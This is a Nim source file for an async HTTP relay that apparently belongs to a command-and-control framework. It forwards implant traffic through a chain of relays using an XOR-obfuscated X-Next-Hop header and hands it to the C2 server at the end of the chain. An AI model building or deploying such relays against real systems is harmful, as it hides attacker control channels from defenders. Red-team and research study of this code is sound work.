#[
    HTTP Relay Server - Async HTTP Server
    Forwards HTTP requests with X-Next-Hop header
    When chain ends, forwards directly to C2
]#

import asyncdispatch, asynchttpserver, strutils, base64, httpclient
import ../util/crypto
import ../config/configParser

const INITIAL_XOR_KEY {.intdefine.}: int = 459457925

# Decrypt X-Next-Hop header (encrypted with INITIAL_XOR_KEY)
proc decryptNextHop*(encrypted: string): string =
    try:
        let decoded = base64.decode(encrypted)
        result = xorString(decoded, INITIAL_XOR_KEY)
        when defined debug:
            echo "[RELAY] 🔓 Decrypted X-Next-Hop: " & result
    except:
        when defined debug:
            echo "[RELAY] ❌ Failed to decrypt X-Next-Hop"
        result = ""

# Encrypt next hop chain for X-Next-Hop header
proc encryptNextHop*(hopChain: string): string =
    let xored = xorString(hopChain, INITIAL_XOR_KEY)
    result = base64.encode(xored)

# Pop first hop from chain, return (firstHop, remainingHops)
proc popNextHop*(hopChain: string): (string, string) =
    if "," in hopChain:
        let parts = hopChain.split(",")
        result = (parts[0], parts[1..^1].join(","))
    else:
        result = (hopChain, "")

# Encrypt relay GUID for X-Relay-GUID header
proc encryptRelayGuid(guid: string): string =
    let xored = xorString(guid, INITIAL_XOR_KEY)
    result = base64.encode(xored)

# Async HTTP relay server
# c2Url: Full C2 URL (e.g., "https://example.replit.dev:443")
proc startRelayServer*(port: int, relayGuid: string = "", c2Url: string = "") {.async.} =
    when defined debug:
        echo "[RELAY] 🚀 Starting async HTTP relay server on port " & $port
        if c2Url != "":
            echo "[RELAY] 🎯 C2 target: " & c2Url
    
    var server = newAsyncHttpServer()
    
    proc handleRequest(req: Request): Future[void] {.async, gcsafe.} =
        when defined debug:
            echo "[RELAY] 🔌 " & $req.reqMethod & " " & req.url.path & " from " & req.hostname
        
        try:
            # Extract X-Next-Hop header
            var nextHopHeader = ""
            if req.headers.hasKey("x-next-hop"):
                nextHopHeader = req.headers["x-next-hop"]
            elif req.headers.hasKey("X-Next-Hop"):
                nextHopHeader = req.headers["X-Next-Hop"]
            
            if nextHopHeader == "":
                when defined debug:
                    echo "[RELAY] ❌ Missing X-Next-Hop header"
                await req.respond(Http400, "Missing X-Next-Hop")
                return
            
            # Decrypt hop chain
            let hopChain = decryptNextHop(nextHopHeader)
            if hopChain == "":
                await req.respond(Http400, "Invalid X-Next-Hop")
                return
            
            # Pop first hop
            let (nextHop, remainingHops) = popNextHop(hopChain)
            
            when defined debug:
                echo "[RELAY] ➡️  Next hop: " & nextHop
                if remainingHops != "":
                    echo "[RELAY] 📝 Remaining hops: " & remainingHops
                else:
                    echo "[RELAY] ✅ End of chain - forwarding to C2"
            
            # Determine target URL
            var targetUrl: string
            var fwdHeaders = newHttpHeaders()
            
            if remainingHops == "":
                # End of chain - forward to C2
                if c2Url == "":
                    when defined debug:
                        echo "[RELAY] ❌ No C2 URL configured"
                    await req.respond(Http500, "No C2 configured")
                    return
                
                targetUrl = c2Url & req.url.path
                when defined debug:
                    echo "[RELAY] 🎯 Forwarding to C2: " & targetUrl
                
                # Copy headers but remove relay-specific ones
                for key, value in req.headers.pairs:
                    let lowerKey = key.toLower()
                    if lowerKey notin ["host", "connection", "content-length", "x-next-hop"]:
                        fwdHeaders[key] = value
                
                # Add X-Relay-GUID if we have one
                if relayGuid != "":
                    fwdHeaders["X-Relay-GUID"] = encryptRelayGuid(relayGuid)
            else:
                # More hops - forward to next relay
                targetUrl = "http://" & remainingHops.split(",")[0] & req.url.path
                when defined debug:
                    echo "[RELAY] ↪️  Forwarding to next relay: " & targetUrl
                
                # Copy headers
                for key, value in req.headers.pairs:
                    let lowerKey = key.toLower()
                    if lowerKey notin ["host", "connection", "content-length", "x-next-hop"]:
                        fwdHeaders[key] = value
                
                # Update X-Next-Hop with remaining hops
                fwdHeaders["X-Next-Hop"] = encryptNextHop(remainingHops)
                
                # Add X-Relay-GUID if we have one
                if relayGuid != "":
                    fwdHeaders["X-Relay-GUID"] = encryptRelayGuid(relayGuid)
            
            # Create HTTP client and forward request
            var client = newAsyncHttpClient()
            
            when defined debug:
                echo "[RELAY] 📤 Sending request to: " & targetUrl
            
            let response = await client.request(targetUrl, httpMethod = HttpGet, headers = fwdHeaders)
            let responseBody = await response.body
            
            when defined debug:
                echo "[RELAY] 📥 Response: " & $response.code.int & " (" & $responseBody.len & " bytes)"
            
            # Forward response
            await req.respond(response.code, responseBody, response.headers)
            client.close()
            
        except Exception as e:
            when defined debug:
                echo "[RELAY] ❌ Error: " & e.msg
            try:
                await req.respond(Http502, "Relay error")
            except:
                discard
    
    when defined debug:
        echo "[RELAY] ✅ Listening on 0.0.0.0:" & $port
    
    await server.serve(Port(port), handleRequest)
